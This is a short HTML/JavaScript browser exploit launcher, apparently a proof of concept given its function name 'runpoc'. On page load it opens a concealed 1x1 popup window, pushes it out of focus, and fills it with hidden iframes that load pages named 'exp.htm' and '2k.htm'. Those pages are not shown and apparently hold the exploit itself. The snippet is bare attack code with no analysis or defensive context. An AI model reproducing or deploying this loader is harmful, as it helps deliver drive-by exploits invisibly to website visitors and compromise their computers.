<script type="text/javascript">
function runpoc(iframecount)
{
top.consoleRef = open('blankWindow.htm','BlankWindow','width=1,height=1'+',menubar=0'+',toolbar=1'+',status=0'+',scrollbars=0'+',left=1'+',top=1'+',resizable=0');

top.consoleRef.blur();

top.consoleRef.document.writeln('<html>'+'<head>'+'<title>CT</title>'+'</head>'+'<body onBlur=self.blur()>'+'</body></html>');

self.focus();

for (i=1 ; i <=iframecount ; i++)
{ 
top.consoleRef.document.writeln('<iframe width=1 height=1 border=0 frameborder=0 src=exp.htm></iframe>')
}
if( iframecount == 8 ){
top.consoleRef.document.writeln('<iframe width=1 height=1 border=0 frameborder=0 src=2k.htm></iframe>')
}

}
runpoc(8);
</script>
